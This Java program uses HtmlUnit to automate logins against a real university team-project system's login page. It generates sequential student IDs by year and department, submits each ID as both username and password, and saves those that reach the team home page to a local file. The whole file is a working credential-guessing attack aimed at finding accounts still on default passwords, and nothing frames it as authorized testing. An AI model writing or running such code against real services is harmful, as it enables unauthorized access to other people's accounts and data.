import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

public class TPS {
	public static void main(final String[] args) throws Exception {
		final Path path = Paths.get("./", "ids.txt");
		
		try (WebClient client = new WebClient()) {
			client.getOptions().setCssEnabled(false);
			client.getOptions().setJavaScriptEnabled(false);
			HtmlPage page;
			HtmlPage newPage;
			final String attributeName = "value";
			
			for (int year = 2019; year < 2021; year++) {
				for (int i = 2; i < 4; i++) { // ce 2, se 3, eee 7
					for (int j = 0; j < 100; j++) {
						page = client.getPage("http://setps.ieu.edu.tr/accounts/logout/");
						final HtmlInput id = page.getElementByName("universityid");
						final HtmlInput password = page.getElementByName("tpspass");
						final HtmlButton button = (HtmlButton) page.getByXPath("/html/body/div[2]/div/div[2]/div[1]/form/button").get(0);
						String department = "060" + i;
						
						if (j < 10) {
							department += "00";
						} else {
							department += "0";
						}
						final String attributeValue = year + department + j;
						id.setAttribute(attributeName, attributeValue);
						password.setAttribute(attributeName, attributeValue);
						
						try {
							newPage = button.click();
							System.out.print(attributeValue);
							
							if (newPage.getTitleText().equals("TPS - Team Home")) {
								System.out.print(" +");
								Files.write(path, (attributeValue + System.getProperty("line.separator")).getBytes(), StandardOpenOption.APPEND, StandardOpenOption.CREATE);
							}
							System.out.println();
						} catch (FailingHttpStatusCodeException exception) {
							System.out.println(attributeValue + " " + exception.getStatusCode());
						}
					}
				}
			}
		}
	}
}
